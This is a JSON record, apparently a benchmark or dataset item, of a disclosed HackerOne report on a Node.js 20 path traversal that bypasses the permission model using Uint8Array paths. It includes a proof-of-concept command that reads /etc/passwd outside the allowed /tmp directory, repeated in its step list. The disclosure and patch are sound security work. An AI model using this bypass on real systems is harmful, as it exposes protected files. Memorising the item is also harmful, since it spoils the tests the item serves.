@@ -1,0 +1,38 @@
+{
+  "reported_to": "Internet Bug Bounty",
+  "reported_by": "tniessen ",
+  "title": "Path traversal through path stored in Uint8Array in Node.js 20",
+  "content": "\nVarious node:fs functions allow specifying paths as either strings or Uint8Array objects. In Node.js environments, the Buffer class extends the Uint8Array class. Node.js prevents path traversal through strings (see CVE-2023-30584) and Buffer objects (see CVE-2023-32004), but not through non-Buffer Uint8Array objects.\nThis is distinct from CVE-2023-32004 (report 2038134), which only referred to Buffer objects. However, the vulnerability follows the same pattern using Uint8Array instead of Buffer.\nSteps To Reproduce:\nThe following Node.js command prints the contents of /etc/passwd despite having been granted access to /tmp only. This relies on the fact that TextDecoder produces Uint8Array objects that are not Buffer objects.\nCode 322 Bytes\n1$ node --experimental-permission \\\n2        --allow-fs-read=/tmp/ \\\n3        -p 'fs.readFileSync(new TextEncoder().encode(\"/tmp/../etc/passwd\"))'\n4<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ... 2103 more bytes>\nSupporting Material/References:\nCVE-2023-30584 (report 1952978)\nCommit 205f1e6 prevents CVE-2023-30584 but ignores non-string inputs.\nCVE-2023-32004 (report 2038134)\nCommit 1f64147 prevents CVE-2023-32004 but ignores non-Buffer objects.\nPatch\nI provided a patch, which was merged into Node.js 20 as commit fa5dae1944.\nImpact\nEquivalent to CVE-2023-30584 (report 1952978) and CVE-2023-32004 (report 2038134).\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 3495,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1705785960,
+  "report_url": "https://hackerone.com/reports/2256167",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Run Node.js with experimental permissions and restricted filesystem access: `node --experimental-permission --allow-fs-read=/tmp/`"
+    ],
+    [
+      2,
+      "Execute the following command to read a file outside the allowed directory: `fs.readFileSync(new TextEncoder().encode(\"/tmp/../etc/passwd\"))`"
+    ]
+  ],
+  "vuln_description": "Node.js fails to prevent path traversal when the path is provided as a non-Buffer Uint8Array object, despite having protections in place for string and Buffer inputs. This allows bypassing filesystem permission restrictions.",
+  "reason": "The vulnerability requires understanding of Node.js's permission system, the difference between Buffer and Uint8Array types, and knowledge of how TextEncoder produces Uint8Array objects. However, the attack itself is straightforward once these components are understood.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "2038134"
+}
